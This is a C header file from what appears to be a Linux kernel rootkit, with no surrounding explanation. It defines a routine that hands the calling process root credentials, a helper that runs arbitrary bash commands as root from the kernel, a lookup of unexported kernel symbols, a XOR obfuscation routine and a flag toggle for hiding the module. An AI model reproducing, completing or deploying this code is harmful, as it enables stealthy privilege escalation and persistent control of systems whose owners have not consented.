#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
# include <linux/kmod.h>
#else
# include <linux/umh.h>
#endif

#define do_encrypt(ptr, len, key)	do_encode(ptr, len, key)
#define do_decrypt(ptr, len, key)	do_encode(ptr, len, key)

static inline unsigned int custom_rol32(unsigned int val, int n)
{
	return ((val << n) | (val >> (32 - n)));
}

static inline void do_encode(void *ptr, unsigned int len, unsigned int key)
{
	while (len > sizeof(key)) {
		*(unsigned int *)ptr ^= custom_rol32(key ^ len, (len % 13));
		len -= sizeof(key), ptr += sizeof(key);
	}
}

static inline int exec(char **argv)
{
	char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; 
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int run_cmd(char *cmd)
{
	char *argv[] = {"/bin/bash", "-c", cmd, NULL};
	return exec(argv);
}

static int ksym_lookup_cb(unsigned long data[], const char *name, void *module,
			  unsigned long addr)
{
	int i = 0;
	while (!module && (((const char *)data[0]))[i] == name[i]) {
		if (!name[i++])
			return !!(data[1] = addr);
	}
	return 0;
}

static inline unsigned long ksym_lookup_name(const char *name)
{
	unsigned long data[2] = {(unsigned long)name, 0};
	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
	return data[1];
}

#ifdef CONFIG_GIVE_ROOT
static inline void get_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
	current->uid = 0;
	current->suid = 0;
	current->euid = 0;
	current->gid = 0;
	current->egid = 0;
	current->fsuid = 0;
	current->fsgid = 0;
	cap_set_full(current->cap_effective);
	cap_set_full(current->cap_inheritable);
	cap_set_full(current->cap_permitted);
#else
	commit_creds(prepare_kernel_cred(0));
#endif
}
#endif

extern int hidden;

static inline void flip_hidden_flag(void)
{
    if (hidden)
        hidden = 0;
    else
        hidden = 1;
}

int util_init(void);
int get_cmdline(struct task_struct *task, char *buffer, int buflen);
//int run_cmd(const char *cmd);